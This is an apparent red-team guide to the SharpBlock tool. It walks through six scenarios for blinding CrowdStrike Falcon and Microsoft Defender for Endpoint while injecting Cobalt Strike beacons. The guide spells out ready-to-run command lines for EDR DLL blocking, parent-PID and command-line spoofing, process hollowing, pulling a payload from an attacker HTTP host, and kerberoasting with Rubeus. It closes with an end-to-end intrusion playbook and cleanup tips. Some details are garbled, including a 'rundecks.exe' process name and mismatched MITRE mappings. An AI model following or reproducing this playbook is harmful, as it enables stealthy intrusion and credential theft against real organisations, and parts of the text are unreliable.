# SharpBlock — Hands-On Use Cases

## Use Case 1: Bypass Crowdstrike Falcon with Command-Line Spoofing

**Scenario:** A red-team operator has gained command-line access to a Windows host running Crowdstrike Falcon EDR. They want to execute a Cobalt Strike beacon without triggering EDR detection. They use SharpBlock to spawn a suspended `cmd.exe`, block Falcon's EDR DLL, inject the beacon, and execute.

**Step 1: Identify the Target EDR DLL**

On the compromised host, enumerate loaded DLLs to find Falcon's DLL:
```powershell
# List all loaded DLLs (Sysinternals tool or Process Explorer)
ListDlls.exe | findstr -i crowdstrike
# or
Get-Process | Select-Object -ExpandProperty Modules | Select-Object FileName | Select-String -Pattern "crowdstrike"
```

**Expected Output:**
```
C:\Program Files\CrowdStrike\CSFalconService.exe
C:\Program Files\CrowdStrike\CSFalconContainer.exe
C:\Windows\System32\csagent.dll (CrowdStrike Falcon Sensor)
C:\Windows\System32\cswscr.dll (CrowdStrike scripting integration)
```

**Key DLL:** `csagent.dll` — the main EDR hook DLL.

**Step 2: Prepare Payload**

Pre-stage the Cobalt Strike beacon (`beacon.exe`) on the target:
```bash
# On attacker machine: generate Cobalt Strike artifact
generate_beacon_exe
# Transfer to target via upload to C2 session, SMB share, etc.
```

**Step 3: Invoke SharpBlock**

```bash
# On target, using existing shell/RDP access:
C:\Temp\SharpBlock.exe -s cmd.exe -e C:\Temp\beacon.exe -a "/c echo test" -n csagent.dll
```

**Breakdown:**
- `-s cmd.exe`: Spawn cmd.exe as the hollow process (innocent-looking process for spawning).
- `-e C:\Temp\beacon.exe`: Inject the Cobalt Strike beacon.
- `-a "/c echo test"`: Command-line spoofing — beacon will appear to be `cmd.exe /c echo test`, not a malicious beacon.
- `-n csagent.dll`: Block the CrowdStrike EDR DLL by name.

**Step 4: Beacon Callback**

The beacon executes, connects to the Cobalt Strike team server:
```
Beacon callback received from 192.168.1.50:53928
Beacon URI: /submit (standard Cobalt Strike URI)
Target: victim-pc (hostname)
User: DOMAIN\attacker-account
```

**From EDR's Perspective:**
- Falcon sees `cmd.exe /c echo test` spawned from RDP session.
- Falcon does *not* see the beacon's C2 callback, API calls, or behavior (due to DLL block).
- No alert generated.

**MITRE ATT&CK Mapping:**
- **T1562.001** - Disable or Modify Tools (blocking EDR DLL).
- **T1036.004** - Masquerading: Rename System Utilities (process name appears to be cmd.exe).
- **T1036.003** - Masquerading: Match Legitimate Name or Location (command-line spoofing).
- **T1055.012** - Process Injection: Process Hollowing (injecting beacon into cmd.exe).
- **T1071** - Application Layer Protocol (C2 callback via HTTP/HTTPS).

---

## Use Case 2: Bypass Microsoft Defender for Endpoint (MDE) via Parent Process Spoofing

**Scenario:** A red-team operator is on a corporate Windows 10 host with Microsoft Defender for Endpoint (MDE) running. Instead of appearing to launch the beacon directly, they want it to appear as a child of `svchost.exe` (a legitimate service host process), making detection less likely.

**Step 1: Find a svchost.exe Process ID**

```powershell
Get-Process svchost | Select-Object -First 1 Name, Id
# Output: svchost 1024
```

**Step 2: Prepare SharpBlock Injection**

```bash
# On target:
C:\Tools\SharpBlock.exe -s notepad.exe -e C:\Staging\beacon.exe -a "/c powershell.exe -NoP -W H" --ppid 1024 -d "Microsoft Endpoint Protection"
```

**Breakdown:**
- `-s notepad.exe`: Use notepad.exe as the hollow process (less suspicious than cmd.exe).
- `-e C:\Staging\beacon.exe`: Inject beacon from staging directory.
- `-a "/c powershell.exe -NoP -W H"`: Appear to run PowerShell with hidden window (benign-looking command).
- `--ppid 1024`: Spoof parent process ID to svchost.exe (PID 1024).
- `-d "Microsoft Endpoint Protection"`: Block MDE's DLL by description (varies by MDE version; common: `msse.dll`, `mpengine.dll`).

**Step 3: Execution**

SharpBlock:
1. Spawns notepad.exe suspended.
2. Blocks the MDE EDR DLL by description match.
3. Injects beacon into notepad's memory.
4. Modifies `PEB.ProcessParameters.ParentProcessId` to 1024 (svchost.exe).
5. Modifies command-line to `/c powershell.exe -NoP -W H`.
6. Resumes execution → beacon callback.

**From MDE's Perspective:**
- Process tree shows: `svchost.exe → notepad.exe` (legitimate parent-child).
- Command line shows: `/c powershell.exe -NoP -W H` (suspicious, but parent is svchost.exe so less alarming than cmd.exe).
- MDE's DLL hooks are blocked, so no behavioral detection of C2 callback or malicious API calls.

**Detection Weakness:** A sharp analyst reviewing process trees will note that `svchost.exe` doesn't typically spawn `notepad.exe` or `cmd.exe` — this is a red flag. However, in high-volume environments, this may not trigger immediate investigation.

**MITRE ATT&CK Mapping:**
- **T1562.001** - Disable or Modify Tools (blocking MDE DLL).
- **T1036.005** - Masquerading: Match Legitimate Name or Location (svchost parent spoofing).
- **T1134.005** - Access Token Manipulation: Make and Impersonate Token (process tree spoofing).
- **T1055.012** - Process Injection: Process Hollowing.

---

## Use Case 3: EDR Evasion via HTTP-Fetched Payload

**Scenario:** A red-team operator wants to minimize staging artifacts on the target. Instead of pre-uploading a beacon, they want SharpBlock to fetch the beacon from an attacker-controlled HTTP server at injection time. This reduces the risk of the beacon binary being discovered on disk before execution.

**Step 1: Host Payload on HTTP Server**

```bash
# On attacker server:
python3 -m http.server 8080 --directory /home/attacker/payloads
# beacon.exe is available at http://attacker.com:8080/beacon.exe
```

**Step 2: Invoke SharpBlock with HTTP Payload Fetch**

```bash
# On target, with network access to attacker server:
C:\Tools\SharpBlock.exe -s rundecks.exe -e "http://attacker.com:8080/beacon.exe" -a "/c echo ok" -n csagent.dll
```

**Breakdown:**
- `-e "http://attacker.com:8080/beacon.exe"`: SharpBlock fetches beacon from HTTP URL, stores in memory (not disk).
- Beacon is never written to the target's disk; only the SharpBlock.exe binary exists on disk.
- `-s rundll32.exe`: Use rundll32 as the hollow process (matches legitimate DLL-invocation patterns).

**Step 3: Execution**

SharpBlock:
1. Spawns rundll32.exe suspended.
2. Fetches beacon from HTTP server (network traffic may be logged, but in a C2 session, it's within the attacker's control).
3. Injects beacon into rundll32.exe in memory.
4. Resumes execution → beacon calls back.

**Forensic Impact:** Minimal disk artifacts — no beacon binary on target, only SharpBlock.exe (which may be deleted or already cleaned up). However, network logs show HTTP request to attacker server during the compromise window.

**MITRE ATT&CK Mapping:**
- **T1105** - Ingress Tool Transfer (beacon fetched via HTTP).
- **T1562.001** - Disable or Modify Tools (EDR blocked).
- **T1055.012** - Process Injection: Process Hollowing.

---

## Use Case 4: Cobalt Strike Integration — Named Pipe Payload Delivery

**Scenario:** A red-team operator is using Cobalt Strike to manage the compromise. Instead of generating a standalone beacon binary, they want to use Cobalt Strike's **process injection** module, which sends shellcode via a named pipe to SharpBlock. SharpBlock then receives the shellcode from the named pipe and injects it into a hollow process.

**Step 1: Generate Shellcode in Cobalt Strike**

```
Beacon Console:
> execute-assembly /path/to/SharpBlock.exe -e \\.\pipe\payload -n csagent.dll
```

Or, more commonly, use Cobalt Strike's `inject` command with SharpBlock as the injection handler:
```
Beacon Console:
> inject <target_pid> x64 \\.\pipe\sharpblock_payload
```

**Step 2: Cobalt Strike Sends Shellcode via Named Pipe**

Cobalt Strike writes the beacon shellcode to the named pipe `\\.\pipe\payload`, where SharpBlock is listening:

```bash
# SharpBlock invocation (in Cobalt Strike's context):
SharpBlock.exe -e \\.\pipe\sharpblock_payload -a "/c calc.exe" -s cmd.exe -n csagent.dll
```

**Breakdown:**
- `-e \\.\pipe\sharpblock_payload`: SharpBlock receives shellcode/beacon from the named pipe.
- Cobalt Strike writes the beacon shellcode to the pipe.
- SharpBlock loads the shellcode, injects into cmd.exe, and executes.

**Step 3: Execution**

- Cobalt Strike sends beacon shellcode.
- SharpBlock receives it via named pipe.
- Beacon initializes and calls back to Cobalt Strike.

**Advantage:** Minimal disk footprint — no separate beacon.exe file; shellcode delivered in-memory via pipe. Only SharpBlock.exe binary exists on disk (and may already be from a previous Cobalt Strike payload execution).

**MITRE ATT&CK Mapping:**
- **T1559.002** - Inter-Process Communication: Pipe (named pipe delivery).
- **T1055.012** - Process Injection: Process Hollowing.
- **T1562.001** - Disable or Modify Tools (EDR bypassed).

---

## Use Case 5: Red-Team Assessment — Testing EDR Resilience

**Scenario:** A red-team operator is conducting a security assessment of a customer's Windows infrastructure. The customer has deployed an EDR solution, and the red-team wants to test whether the EDR can detect SharpBlock-based injections. The red-team runs SharpBlock with various `--disable-bypass-*` flags to test which EDR bypass techniques are most effective.

**Test 1: Full Bypass (All Techniques Enabled)**

```bash
SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll
```

**Expected Result:** Beacon executes, calls back undetected. ✅ EDR bypass successful.

**Test 2: No AMSI Bypass**

```bash
SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll --disable-bypass-amsi
```

**Expected Result:** If beacon uses PowerShell, it may be detected by AMSI despite DLL blocking.

**Test 3: No ETW Bypass**

```bash
SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll --disable-bypass-etw
```

**Expected Result:** EDR's ETW-based logging may capture process execution, injection, or API calls.

**Test 4: No Command-Line Spoofing**

```bash
SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll --disable-bypass-cmdline
```

**Expected Result:** Beacon's real command-line becomes visible; EDR may detect suspicious arguments.

**Test 5: No Header Patching (Process Hollowing Detection Possible)**

```bash
SharpBlock.exe -s cmd.exe -e beacon.exe -n csagent.dll --disable-header-patch
```

**Expected Result:** EDR may detect process-hollowing attack pattern via memory signature scanning.

**Findings:** Document which bypass techniques are most impactful; provide the customer with remediation recommendations (e.g., improve AMSI integration, enhance ETW monitoring, deploy kernel-level behavioral monitoring).

**MITRE ATT&CK Mapping:**
- **T1562.001** - Disable or Modify Tools (testing various EDR bypass approaches).
- **T1592** - Gather Victim Host Information (assessing EDR capability).

---

## Use Case 6: Lateral Movement via SharpBlock Injection into Service Hosts

**Scenario:** A red-team operator has compromised a Windows workstation and wants to move laterally to a server. They execute a Kerberos ticket-theft tool (e.g., Rubeus, Mimikatz) injected via SharpBlock into a high-privilege service process to avoid EDR detection.

**Step 1: Identify High-Privilege Service**

```powershell
Get-Process | Where-Object {$_.ProcessName -like "*svc*"} | Select-Object Name, Id
# Output: csrss.exe (PID: 512, SYSTEM privileges)
```

**Step 2: Inject Rubeus via SharpBlock**

```bash
SharpBlock.exe -s cmd.exe -e rubeus.exe -a "kerberoast" -n csagent.dll --ppid 512
```

**Breakdown:**
- Rubeus (a Kerberos extraction tool) is injected into cmd.exe.
- Appears to be spawned by csrss.exe (SYSTEM privileges).
- Rubeus executes kerberoasting attack (extract Kerberos hashes for offline cracking).
- EDR doesn't see the attack due to DLL blocking.

**Step 3: Collect Output**

Rubeus outputs kerberos hashes; attacker exfiltrates or cracks offline.

**MITRE ATT&CK Mapping:**
- **T1558.003** - Steal or Forge Kerberos Tickets: Kerberoasting (Rubeus credential extraction).
- **T1562.001** - Disable or Modify Tools (EDR bypassed via SharpBlock).
- **T1087** - Account Discovery (Kerberoasting enumeration).

---

## Summary Table — When Each Use Case Applies

| Use Case | When It Happens | Attacker Goal | EDR Focus |
|---|---|---|---|
| **1: Falcon Bypass** | During hands-on C2 session. | Execute beacon undetected on Falcon-protected host. | Block Crowdstrike DLL by name. |
| **2: MDE + Parent Spoofing** | On MDE-protected host, wants to hide parent. | Beacon appears to be child of svchost.exe. | Spoof parent PID; block MDE DLL. |
| **3: HTTP Payload Fetch** | Minimizes disk staging. | Beacon fetched in-memory from HTTP. | No beacon binary on disk; only SharpBlock. |
| **4: Cobalt Strike Named Pipe** | In Cobalt Strike campaign. | Receive shellcode from team server via pipe. | Minimal disk footprint; in-memory delivery. |
| **5: EDR Resilience Testing** | Red-team assessment; testing customer EDR. | Determine which bypass techniques work. | Test combinations of disable flags. |
| **6: Lateral Movement via Injection** | Post-compromise lateral movement. | Execute credential-theft tool in service context. | Steal Kerberos tickets/hashes. |

---

## Key Evasion Workflow — Operator Playbook

```
1. Gain initial access via credential compromise, phishing, exploit, etc.
2. Open reverse shell or C2 session.
3. Enumerate EDR (identify DLL name, copyright, description).
4. Stage beacon or select payload.
5. Invoke SharpBlock:
   SharpBlock.exe -s <legitimate_exe> -e <beacon> -a "<innocent_args>" -n <edr_dll> [--ppid <spoof_parent>] [--disable-bypass-* flags as needed]
6. Beacon executes, calls back to C2.
7. Attacker has interactive access inside the network, with EDR blinded.
8. Proceed with lateral movement, credential theft, persistence, etc. (all via injected processes to avoid EDR).
```

---

## Common Mistakes (Defender Detection)

1. **Using cmd.exe or powershell.exe without spoofing**: EDR may flag these as unusual launch sources.
2. **Not identifying the correct EDR DLL**: If the wrong DLL is blocked, EDR remains active and may detect the injection.
3. **Leaving SharpBlock binary on disk**: Post-execution, delete SharpBlock.exe to avoid forensic recovery.
4. **Not spoofing command-line**: Beacon's real command-line may be visible to EDR if command-line spoofing fails.
5. **HTTP beacon fetching over unencrypted network**: Network monitoring may detect the HTTP GET to attacker server; use HTTPS or obfuscate the payload.
6. **Running SharpBlock from user context into system processes**: May fail silently or require privilege escalation; expect failure if the target process has higher privilege than SharpBlock's context.
